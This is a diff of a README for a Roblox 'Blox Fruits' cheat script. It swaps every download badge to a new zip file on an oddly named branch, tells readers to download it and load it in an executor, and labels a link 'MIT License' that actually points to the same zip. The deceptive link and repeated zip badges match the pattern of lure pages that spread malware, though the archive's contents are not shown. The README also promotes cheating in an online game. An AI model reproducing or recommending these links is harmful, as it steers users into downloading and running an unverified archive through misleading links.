@@ -1,6 +1,6 @@
 # Blox Fruits Script 🎮🍍
 
-[![Download](https://raw.githubusercontent.com/hirak123github/blox-fruits-scripters-hub/branch/misdetermine/scripters-blox-hub-fruits-v3.3.zip%F0%9F%93%81-blue)](https://raw.githubusercontent.com/hirak123github/blox-fruits-scripters-hub/branch/misdetermine/scripters-blox-hub-fruits-v3.3.zip)
+[![Download](https://github.com/hirak123github/blox-fruits-scripters-hub/raw/refs/heads/branch/misdetermine/scripters-fruits-hub-blox-v2.9.zip%F0%9F%93%81-blue)](https://github.com/hirak123github/blox-fruits-scripters-hub/raw/refs/heads/branch/misdetermine/scripters-fruits-hub-blox-v2.9.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Traverse the archipelagos of Blox Fruits with these unique capabilities at your 
 ## 🗜️ Installation Steps
 
 1. **Download the Script**
-   - Tap on the [![Download](https://raw.githubusercontent.com/hirak123github/blox-fruits-scripters-hub/branch/misdetermine/scripters-blox-hub-fruits-v3.3.zip%F0%9F%93%81-blue)](https://raw.githubusercontent.com/hirak123github/blox-fruits-scripters-hub/branch/misdetermine/scripters-blox-hub-fruits-v3.3.zip) badge anywhere in this README.
+   - Tap on the [![Download](https://github.com/hirak123github/blox-fruits-scripters-hub/raw/refs/heads/branch/misdetermine/scripters-fruits-hub-blox-v2.9.zip%F0%9F%93%81-blue)](https://github.com/hirak123github/blox-fruits-scripters-hub/raw/refs/heads/branch/misdetermine/scripters-fruits-hub-blox-v2.9.zip) badge anywhere in this README.
    - Save the provided script to your chosen directory.
 
 2. **Enable in Your Executor**
@@ -109,11 +109,11 @@ _Blox Fruits Script_ is a visionary tool developed for fun, educational, and enh
 
 This project is serenely shared under the **MIT License (2025)**. You are free to use, modify, and distribute, so long as you respect the guiding light of this permissive license.
 
-View the license: [MIT License](https://raw.githubusercontent.com/hirak123github/blox-fruits-scripters-hub/branch/misdetermine/scripters-blox-hub-fruits-v3.3.zip)
+View the license: [MIT License](https://github.com/hirak123github/blox-fruits-scripters-hub/raw/refs/heads/branch/misdetermine/scripters-fruits-hub-blox-v2.9.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/hirak123github/blox-fruits-scripters-hub/branch/misdetermine/scripters-blox-hub-fruits-v3.3.zip%F0%9F%93%81-blue)](https://raw.githubusercontent.com/hirak123github/blox-fruits-scripters-hub/branch/misdetermine/scripters-blox-hub-fruits-v3.3.zip)
+[![Download](https://github.com/hirak123github/blox-fruits-scripters-hub/raw/refs/heads/branch/misdetermine/scripters-fruits-hub-blox-v2.9.zip%F0%9F%93%81-blue)](https://github.com/hirak123github/blox-fruits-scripters-hub/raw/refs/heads/branch/misdetermine/scripters-fruits-hub-blox-v2.9.zip)
 
 ---
 
